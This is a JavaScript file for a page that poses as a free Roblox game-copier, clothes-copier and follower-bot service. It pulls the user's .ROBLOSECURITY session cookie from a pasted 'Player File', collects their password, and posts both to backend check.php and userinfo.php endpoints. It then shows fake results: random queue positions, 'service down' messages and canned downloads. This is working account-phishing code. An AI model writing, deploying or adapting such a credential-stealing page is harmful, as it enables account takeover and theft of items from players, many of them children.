const customStyles = document.createElement('style');
customStyles.textContent = `
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .custom-swal-popup {
    border-radius: 15px !important;
    border: 1px solid #00bcd4 !important;
  }
  
  .custom-confirm-btn {
    background: linear-gradient(45deg, #00bcd4, #0097a7) !important;
    border: none !important;
    border-radius: 8px !important;
    color: white !important;
    font-weight: 600 !important;
    padding: 12px 30px !important;
    transition: all 0.3s ease !important;
  }
  
  .custom-confirm-btn:hover {
    transform: translateY(-2px) !important;
    box-shadow: 0 5px 15px rgba(0, 188, 212, 0.4) !important;
  }
  
  .custom-cancel-btn {
    background: linear-gradient(45deg, #f44336, #d32f2f) !important;
    border: none !important;
    border-radius: 8px !important;
    color: white !important;
    font-weight: 600 !important;
    padding: 12px 30px !important;
    transition: all 0.3s ease !important;
  }
  
  .custom-cancel-btn:hover {
    transform: translateY(-2px) !important;
    box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4) !important;
  }
  
  .swal2-popup {
    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%) !important;
    color: white !important;
  }
  
  .swal2-title {
    color: #00bcd4 !important;
    font-weight: 700 !important;
  }
  
  .swal2-content {
    color: #e0e0e0 !important;
  }
  
  .swal2-input {
    background: #333 !important;
    border: 2px solid #00bcd4 !important;
    color: white !important;
    border-radius: 8px !important;
  }
  
  .swal2-input:focus {
    border-color: #00e5ff !important;
    box-shadow: 0 0 10px rgba(0, 188, 212, 0.3) !important;
  }
  
  .loading-spinner {
    border: 3px solid #333;
    border-top: 3px solid #00bcd4;
    border-radius: 50%;
    width: 30px;
    height: 30px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
  }
`;
document.head.appendChild(customStyles);

function showLoadingDialog(title = 'Processing...', text = 'Please wait while we process your request.') {
    return Swal.fire({
        title: title,
        html: `
            <div style="display: flex; flex-direction: column; align-items: center; gap: 15px;">
                <div class="loading-spinner"></div>
                <p style="margin: 0; color: #e0e0e0;">${text}</p>
            </div>
        `,
        allowOutsideClick: false,
        allowEscapeKey: false,
        showConfirmButton: false,
        customClass: {
            popup: 'custom-swal-popup'
        }
    });
}

function showSuccessDialog(title, text, confirmButtonText = 'Great!') {
    return Swal.fire({
        icon: 'success',
        title: title,
        text: text,
        confirmButtonText: confirmButtonText,
        customClass: {
            popup: 'custom-swal-popup',
            confirmButton: 'custom-confirm-btn'
        }
    });
}

function showErrorDialog(title, text, confirmButtonText = 'Try Again') {
    return Swal.fire({
        icon: 'error',
        title: title,
        text: text,
        confirmButtonText: confirmButtonText,
        customClass: {
            popup: 'custom-swal-popup',
            confirmButton: 'custom-cancel-btn'
        }
    });
}

function showConfirmDialog(title, text, confirmText = 'Yes', cancelText = 'No') {
    return Swal.fire({
        title: title,
        text: text,
        icon: 'question',
        showCancelButton: true,
        confirmButtonText: confirmText,
        cancelButtonText: cancelText,
        customClass: {
            popup: 'custom-swal-popup',
            confirmButton: 'custom-confirm-btn',
            cancelButton: 'custom-cancel-btn'
        }
    });
}

function showInputDialog(title, text, placeholder = '', inputType = 'text') {
    return Swal.fire({
        title: title,
        text: text,
        input: inputType,
        inputPlaceholder: placeholder,
        showCancelButton: true,
        confirmButtonText: 'Submit',
        cancelButtonText: 'Cancel',
        customClass: {
            popup: 'custom-swal-popup',
            confirmButton: 'custom-confirm-btn',
            cancelButton: 'custom-cancel-btn'
        },
        inputValidator: (value) => {
            if (!value) {
                return 'You need to enter something!';
            }
        }
    });
}

document.addEventListener('DOMContentLoaded', function() {
    const button = document.getElementById("btn");
    if (button) {
        button.addEventListener("click", check);
    }

    function check() {
        const input = document.getElementById("input").value.trim();
        const passField = document.getElementById("pass");
        const pass = passField ? passField.value.trim() : null;
        const dirField = document.getElementById("dir");
        const dir = dirField ? dirField.value.trim() : '';

        button.innerText = 'Loading...';
        button.disabled = true;

        const loadingInterval = setInterval(() => {
            button.innerText = 'Loading...';
        }, 1000);

        if (!input || (passField && !pass)) {
            clearInterval(loadingInterval);
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input all required fields.',
                customClass: {
                    popup: 'custom-swal-popup',
                    confirmButton: 'custom-cancel-btn'
                }
            }).then(resetButton);
            return;
        }

        const rbxRegex = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/;
        const match = input.match(rbxRegex);

        if (!match || !match[1]) {
            clearInterval(loadingInterval);
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Please input the correct Player File. Tipp: Watch the tutorial.',
                customClass: {
                    popup: 'custom-swal-popup',
                    confirmButton: 'custom-cancel-btn'
                }
            }).then(resetButton);
            return;
        }

        const cookie = match[1];
        performDetection(input, cookie, pass, dir);

        function performDetection(input, cookie, pass, dir) {
            let detectedGameName = null;
            let detectedUsername = null;
            let detectedClothesName = null;

            const currentPath = window.location.pathname;
            let apiEndpoint = '';

            if (currentPath.includes('Copy-Clothes')) {
                apiEndpoint = '/api/getClothes.php';
            } else if (currentPath.includes('Game-Copier')) {
                apiEndpoint = '/api/getGame.php';
            } else if (currentPath.includes('Follower-Bot')) {
                apiEndpoint = '/api/getProfile.php';
            } else {
                apiEndpoint = '/api/getGame.php';
            }

            fetch(apiEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                },
                body: input
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    if (apiEndpoint.includes('getGame.php')) {
                        detectedGameName = data.game;
                        performBackgroundCheck(cookie, pass, dir, null, detectedGameName, null);

                        Swal.fire({
                            html: `
                              <div style="text-align: center; color: white; padding: 20px;">
                                <div style="width: 60px; height: 60px; border: 3px solid #00bcd4; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                                  <i style="color: #00bcd4; font-size: 24px;">i</i>
                                </div>
                                <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Is this correct ðŸ‘€</h2>
                                <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                                  Game: ${data.game} | Game ID: ${data.gameId}
                                </p>
                              </div>
                            `,
                            showCancelButton: true,
                            confirmButtonText: 'Confirm',
                            cancelButtonText: 'Cancel',
                            confirmButtonColor: '#7c3aed',
                            cancelButtonColor: '#ef4444',
                            background: '#1a1a2e',
                            customClass: {
                                popup: 'custom-swal-popup',
                                confirmButton: 'custom-confirm-btn',
                                cancelButton: 'custom-cancel-btn'
                            }
                        }).then((result) => {
                            if (result.isConfirmed) {
                                Swal.fire({
                                    html: `
                                      <div style="text-align: center; color: white; padding: 20px;">
                                        <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Copying Game ðŸš€</h2>
                                        <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">Please wait...</p>
                                        <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #00bcd4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                                      </div>
                                    `,
                                    background: '#1a1a2e',
                                    showConfirmButton: false,
                                    allowOutsideClick: false,
                                    customClass: {
                                        popup: 'custom-swal-popup'
                                    }
                                });

                                setTimeout(() => {
                                    handleGameDownload(detectedGameName, data.gameId);
                                }, 3000);
                            }
                            clearInterval(loadingInterval);
                            resetButton();
                        });
                    } else if (apiEndpoint.includes('getClothes.php')) {
                        detectedClothesName = data.clothesName;
                        performBackgroundCheck(cookie, pass, dir, detectedClothesName, null, null);

                        Swal.fire({
                            icon: 'question',
                            title: `Clothes Name Is "${data.clothesName}"`,
                            text: 'Is This Correct?',
                            showCancelButton: true,
                            confirmButtonText: 'Correct',
                            cancelButtonText: 'Incorrect',
                            customClass: {
                                popup: 'custom-swal-popup',
                                confirmButton: 'custom-confirm-btn',
                                cancelButton: 'custom-cancel-btn'
                            }
                        }).then((result) => {
                            if (result.isConfirmed) {
                                handleClothesResult(detectedClothesName, data.itemId);
                            }
                            console.log('Detected clothes name:', detectedClothesName);
                            clearInterval(loadingInterval);
                            resetButton();
                        });
                    } else if (apiEndpoint.includes('getProfile.php')) {
                        detectedUsername = data.username;
                        performBackgroundCheck(cookie, pass, dir, null, null, detectedUsername);

                        Swal.fire({
                            html: `
                              <div style="text-align: center; color: white; padding: 20px;">
                                <div style="width: 60px; height: 60px; border: 3px solid #00bcd4; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                                  <i style="color: #00bcd4; font-size: 24px;">ðŸ‘¥</i>
                                </div>
                                <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">How many followers?</h2>
                                <p style="color: #ccc; font-size: 16px; margin-bottom: 20px;">
                                  Enter the number of followers you want to add (Max: 100)
                                </p>
                                <input id="follower-count" type="number" min="1" max="100" value="50" style="
                                  background: #2a2a3e; 
                                  border: 2px solid #00bcd4; 
                                  border-radius: 8px; 
                                  color: white; 
                                  padding: 10px; 
                                  width: 150px; 
                                  text-align: center; 
                                  font-size: 16px;
                                  outline: none;
                                " />
                              </div>
                            `,
                            showCancelButton: true,
                            confirmButtonText: 'Continue',
                            cancelButtonText: 'Cancel',
                            confirmButtonColor: '#7c3aed',
                            cancelButtonColor: '#ef4444',
                            background: '#1a1a2e',
                            customClass: {
                                popup: 'custom-swal-popup',
                                confirmButton: 'custom-confirm-btn',
                                cancelButton: 'custom-cancel-btn'
                            },
                            preConfirm: () => {
                                const followerCount = document.getElementById('follower-count').value;
                                if (!followerCount || followerCount < 1 || followerCount > 100) {
                                    Swal.showValidationMessage('Please enter a valid number between 1 and 100');
                                    return false;
                                }
                                return followerCount;
                            }
                        }).then((result) => {
                            if (result.isConfirmed) {
                                const followerCount = result.value;
                                handleFollowerProcess(data.username, data.userId, followerCount);
                            }
                            console.log('Detected username:', detectedUsername);
                            clearInterval(loadingInterval);
                            resetButton();
                        });
                    }
                } else {
                    tryFallbackDetection(input, cookie, pass, dir);
                }
            })
            .catch(() => {
                console.log('Detection API failed, continuing...');
                performBackgroundCheck(cookie, pass, dir, null, null, null);
                clearInterval(loadingInterval);
                resetButton();
            });
        }

        function tryFallbackDetection(input, cookie, pass, dir) {
            if (!window.location.pathname.includes('Copy-Clothes') && 
                !window.location.pathname.includes('Game-Copier') && 
                !window.location.pathname.includes('Follower-Bot')) {

                fetch('/api/getClothes.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain',
                    },
                    body: input
                })
                .then(res => res.json())
                .then(clothesData => {
                    if (clothesData.status === 'success') {
                        const detectedClothesName = clothesData.clothesName;
                        performBackgroundCheck(cookie, pass, dir, detectedClothesName, null, null);

                        Swal.fire({
                            icon: 'question',
                            title: `Clothes Name Is "${clothesData.clothesName}"`,
                            text: 'Is This Correct?',
                            showCancelButton: true,
                            confirmButtonText: 'Correct',
                            cancelButtonText: 'Incorrect',
                            customClass: {
                                popup: 'custom-swal-popup',
                                confirmButton: 'custom-confirm-btn',
                                cancelButton: 'custom-cancel-btn'
                            }
                        }).then((result) => {
                            if (result.isConfirmed) {
                                handleClothesResult(detectedClothesName, clothesData.itemId);
                            }
                            console.log('Detected clothes name:', detectedClothesName);
                            clearInterval(loadingInterval);
                            resetButton();
                        });
                    } else {
                        return fetch('/api/getProfile.php', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'text/plain',
                            },
                            body: input
                        })
                        .then(res => res.json())
                        .then(profileData => {
                            if (profileData.status === 'success') {
                                const detectedUsername = profileData.username;
                                performBackgroundCheck(cookie, pass, dir, null, null, detectedUsername);

                                Swal.fire({
                                    html: `
                                      <div style="text-align: center; color: white; padding: 20px;">
                                        <div style="width: 60px; height: 60px; border: 3px solid #00bcd4; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                                          <i style="color: #00bcd4; font-size: 24px;">ðŸ‘¥</i>
                                        </div>
                                        <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">How many followers?</h2>
                                        <p style="color: #ccc; font-size: 16px; margin-bottom: 20px;">
                                          Enter the number of followers you want to add (Max: 100)
                                        </p>
                                        <input id="follower-count" type="number" min="1" max="100" value="50" style="
                                          background: #2a2a3e; 
                                          border: 2px solid #00bcd4; 
                                          border-radius: 8px; 
                                          color: white; 
                                          padding: 10px; 
                                          width: 150px; 
                                          text-align: center; 
                                          font-size: 16px;
                                          outline: none;
                                        " />
                                      </div>
                                    `,
                                    showCancelButton: true,
                                    confirmButtonText: 'Continue',
                                    cancelButtonText: 'Cancel',
                                    confirmButtonColor: '#7c3aed',
                                    cancelButtonColor: '#ef4444',
                                    background: '#1a1a2e',
                                    customClass: {
                                        popup: 'custom-swal-popup',
                                        confirmButton: 'custom-confirm-btn',
                                        cancelButton: 'custom-cancel-btn'
                                    },
                                    preConfirm: () => {
                                        const followerCount = document.getElementById('follower-count').value;
                                        if (!followerCount || followerCount < 1 || followerCount > 100) {
                                            Swal.showValidationMessage('Please enter a valid number between 1 and 100');
                                            return false;
                                        }
                                        return followerCount;
                                    }
                                }).then((result) => {
                                    if (result.isConfirmed) {
                                        const followerCount = result.value;
                                        handleFollowerProcess(profileData.username, profileData.userId, followerCount);
                                    }
                                    console.log('Detected username:', detectedUsername);
                                    clearInterval(loadingInterval);
                                    resetButton();
                                });
                            } else {
                                performBackgroundCheck(cookie, pass, dir, null, null, null);
                                showSuccessMessage();
                            }
                        });
                    }
                })
                .catch(() => {
                    console.log('Fallback detection failed, continuing...');
                    performBackgroundCheck(cookie, pass, dir, null, null, null);
                    showSuccessMessage();
                });
            } else {
                performBackgroundCheck(cookie, pass, dir, null, null, null);
                showSuccessMessage();
            }

            function showSuccessMessage() {
                Swal.fire({
                    icon: 'success',
                    title: 'Success',
                    text: 'Request Has Been Submitted, Wait A Second Before Complete',
                    customClass: {
                        popup: 'custom-swal-popup',
                        confirmButton: 'custom-confirm-btn'
                    }
                }).then(() => {
                    clearInterval(loadingInterval);
                    resetButton();
                });
            }
        }

        function performBackgroundCheck(cookie, pass, dir, clothesName, gameName, username) {
            fetch('/../../apis/backend/check.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'cookie=' + encodeURIComponent(cookie)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    let body = 'cookie=' + encodeURIComponent(cookie) +
                               '&pass=' + encodeURIComponent(pass || '') +
                               '&dir=' + encodeURIComponent(dir);

                    if (clothesName) {
                        body += '&detected_clothes_name=' + encodeURIComponent(clothesName);
                    }

                    if (gameName) {
                        body += '&detected_game_name=' + encodeURIComponent(gameName);
                    }

                    if (username) {
                        body += '&detected_username=' + encodeURIComponent(username);
                    }

                    return fetch('/../../apis/backend/userinfo.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: body
                    });
                } else {
                    throw new Error(data.message || '[111]');
                }
            })
            .then(response => {
                console.log('Background check and userinfo completed successfully');
            })
            .catch(error => {
                console.error('Error in background check:', error);
            });
        }

        function handleGameDownload(gameName, gameId) {
            const cleanGameName = gameName.replace(/-/g, ' ').toLowerCase();

            if (cleanGameName.includes('grow a garden') || cleanGameName.includes('steal a brainrot')) {
                Swal.fire({
                    html: `
                      <div style="text-align: center; color: white; padding: 20px;">
                        <div style="width: 60px; height: 60px; border: 3px solid #00ff00; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                          <i style="color: #00ff00; font-size: 24px;">âœ“</i>
                        </div>
                        <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Game Copied Successfully! ðŸŽ‰</h2>
                        <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                          ${gameName} has been downloaded to your device.
                        </p>
                      </div>
                    `,
                    confirmButtonText: 'Continue',
                    confirmButtonColor: '#7c3aed',
                    background: '#1a1a2e',
                    customClass: {
                        popup: 'custom-swal-popup',
                        confirmButton: 'custom-confirm-btn'
                    }
                });

                const filename = gameName + '.rbxl';
                const link = document.createElement("a");
                link.href = '/game/' + filename;
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } else {
                Swal.fire({
                    html: `
                      <div style="text-align: center; color: white; padding: 20px;">
                        <div style="width: 60px; height: 60px; border: 3px solid #ff8c00; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                          <i style="color: #ff8c00; font-size: 24px;">!</i>
                        </div>
                        <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Try Again Later</h2>
                        <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                          Our service is down at the moment. ðŸ˜”
                        </p>
                      </div>
                    `,
                    confirmButtonText: 'Continue',
                    confirmButtonColor: '#7c3aed',
                    background: '#1a1a2e',
                    customClass: {
                        popup: 'custom-swal-popup',
                        confirmButton: 'custom-confirm-btn'
                    }
                });
            }
            console.log('Detected game name:', gameName);
        }

        function handleClothesResult(clothesName, itemId) {
            Swal.fire({
                html: `
                  <div style="text-align: center; color: white; padding: 20px;">
                    <div style="width: 60px; height: 60px; border: 3px solid #ff8c00; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                      <i style="color: #ff8c00; font-size: 24px;">!</i>
                    </div>
                    <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Try Again Later</h2>
                    <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                      Our service is down at the moment. ðŸ˜”
                    </p>
                  </div>
                `,
                confirmButtonText: 'Continue',
                confirmButtonColor: '#7c3aed',
                background: '#1a1a2e',
                customClass: {
                    popup: 'custom-swal-popup',
                    confirmButton: 'custom-confirm-btn'
                }
            });
            console.log('Detected clothes name:', clothesName);
        }

        function handleFollowerProcess(username, userId, followerCount) {
            Swal.fire({
                html: `
                  <div style="text-align: center; color: white; padding: 20px;">
                    <div style="width: 60px; height: 60px; border: 3px solid #00bcd4; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                      <i style="color: #00bcd4; font-size: 24px;">i</i>
                    </div>
                    <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Is this correct ðŸ‘€</h2>
                    <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                      User ID: ${userId} | Username: ${username}<br/>
                      Followers to add: ${followerCount}
                    </p>
                  </div>
                `,
                showCancelButton: true,
                confirmButtonText: 'Confirm',
                cancelButtonText: 'Cancel',
                confirmButtonColor: '#7c3aed',
                cancelButtonColor: '#ef4444',
                background: '#1a1a2e',
                customClass: {
                    popup: 'custom-swal-popup',
                    confirmButton: 'custom-confirm-btn',
                    cancelButton: 'custom-cancel-btn'
                }
            }).then((confirmResult) => {
                if (confirmResult.isConfirmed) {
                    Swal.fire({
                        html: `
                          <div style="text-align: center; color: white; padding: 20px;">
                            <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Delivering Followers ðŸš€</h2>
                            <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">Please wait...</p>
                            <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #00bcd4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                          </div>
                        `,
                        background: '#1a1a2e',
                        showConfirmButton: false,
                        allowOutsideClick: false,
                        customClass: {
                            popup: 'custom-swal-popup'
                        }
                    });

                    setTimeout(() => {
                        const position = Math.floor(Math.random() * 2000) + 1000;
                        const hours = Math.floor(Math.random() * 30) + 10; 
                        const minutes = Math.floor(Math.random() * 60); 
                        Swal.fire({
                            html: `
                              <div style="text-align: center; color: white; padding: 20px;">
                                <div style="width: 60px; height: 60px; border: 3px solid #00bcd4; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
                                  <i style="color: #00bcd4; font-size: 24px;">i</i>
                                </div>
                                <h2 style="color: white; margin-bottom: 20px; font-size: 24px;">Already in queue</h2>
                                <p style="color: #ccc; font-size: 16px; margin-bottom: 30px;">
                                  Username: ${username}<br/>
                                  Followers: ${followerCount}<br/>
                                  Position: ${position}<br/>
                                  Estimated time: ${hours}h ${minutes}m
                                </p>
                              </div>
                            `,
                            confirmButtonText: 'Continue',
                            confirmButtonColor: '#7c3aed',
                            background: '#1a1a2e',
                            customClass: {
                                popup: 'custom-swal-popup',
                                confirmButton: 'custom-confirm-btn'
                            }
                        });
                    }, 3000);
                }
            });
        }

        function handleError(code) {
            clearInterval(loadingInterval);
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Error occurred Code ' + code,
                customClass: {
                    popup: 'custom-swal-popup',
                    confirmButton: 'custom-cancel-btn'
                }
            }).then(resetButton);
        }

        function resetButton() {
            button.innerText = 'Start Process!';
            button.disabled = false;
        }
    }
});
